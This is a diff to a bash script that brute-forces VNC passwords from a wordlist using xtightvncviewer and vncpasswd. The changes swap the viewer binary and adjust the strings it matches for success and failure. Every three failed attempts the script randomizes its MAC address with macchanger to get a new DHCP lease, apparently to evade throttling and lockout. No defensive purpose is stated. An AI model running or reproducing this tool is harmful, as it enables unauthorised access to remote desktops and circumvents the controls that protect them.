@@ -7,23 +7,24 @@ connection=0
 echo
 echo -e "\033[34mTrying...\033[0m"
 echo 
-vncviewer $ipadd:$port > stdout.txt 2>&1 &
+xtightvncviewer $ipadd:$port > stdout.txt 2>&1 &
 established=0
 count=0
 sleep 1
 netstat -na | grep 5900
 while [ $established -eq 0 ]; 
 do	#netstat error, showing TIME_WAIT
-	if netstat -na | grep 5900 | grep "ESTABLISHED"; then
-		pkill -f "vncviewer"
+	if netstat -na | grep 5900 | grep "ESTABLISHED" 
+	then
+		pkill -f "xtightvncviewer"
 		established=1
 	elif grep -q "No route to host" stdout.txt
 	then
-		pkill -f "vncviewer"
+		pkill -f "xtightvncviewer"
 		established=-1
-	elif grep -q "No matching security types" stdout.txt
+	elif grep -q "Connection refused" stdout.txt
 	then
-		pkill -f "vncviewer"
+		pkill -f "xtightvncviewer"
 		established=-1
 	else
 		count=$((count+1))
@@ -31,7 +32,7 @@ do	#netstat error, showing TIME_WAIT
 	fi
 	if [ $count -eq 100 ]; then
 		established=-1
-		pkill -f "vncviewer"
+		pkill -f "xtightvncviewer"
 	fi
 done
 sleep 0.1
@@ -44,9 +45,10 @@ sleep 0.1
                 echo -e "\033[31mUnable to connect\033[0m"
         fi
 dhcp_hop(){ # change mac, get new dhcp lease
+	echo "Changing IP..."
         prev_ip=$(hostname -I)
         ifconfig "$interface" down
-        sudo macchanger "$interface" -r 2>&1
+        sudo macchanger "$interface" -r > /dev/null
         ifconfig "$interface" up
         new=0
         while [ $new -eq 0 ];
@@ -58,6 +60,8 @@ dhcp_hop(){ # change mac, get new dhcp lease
                         new=1
                 fi
         done
+	echo "New: $(hostname -I)"
+	echo
 }
 
 if [[ connection -eq 1 ]]
@@ -68,28 +72,29 @@ then
 	while read -r line; do
 		pws=$((pws+1))
 		echo "Trying: ${line}"
-		vncviewer -passwd <(vncpasswd -f <<<"$line") $ipadd:$port > stdout.txt 2>&1 &
+		xtightvncviewer -passwd <(vncpasswd -f <<<"$line") $ipadd:$port > stdout.txt 2>&1 &
 		sleep 1 # avoid throttling
 		tries=$((tries+1))
-		if grep -q "Using pixel format" stdout.txt
+		if grep -q "Authentication succesful" stdout.txt
 		then
-			echo "MATCH FOUND: ${line}"
+			echo "[MATCH FOUND]: ${line}"
+			echo
 			match=1
-			connection=2
-			pkill -f "vncviewer"
-		elif netstat -na | grep 5900 | grep "TIME_WAIT" > /dev/null
+			pkill -f "xtightvncviewer"
+			break
+		elif grep -q "Authentication failed" stdout.txt
 		then
-			pkill -f "vncviewer"
+			pkill -f "xtightvncviewer"
 			echo "[STATUS]: Failed"
+			echo
 			if [[ $tries -eq 3 ]]
 			then
 				dhcp_hop
 				tries=0
-				echo $(hostname -I)
 			fi
 		else
 			echo "Failed"
-			pkill -f "vncviewer"
+			pkill -f "xtightvncviewer"
 		fi
 	done < "$file_name"
 
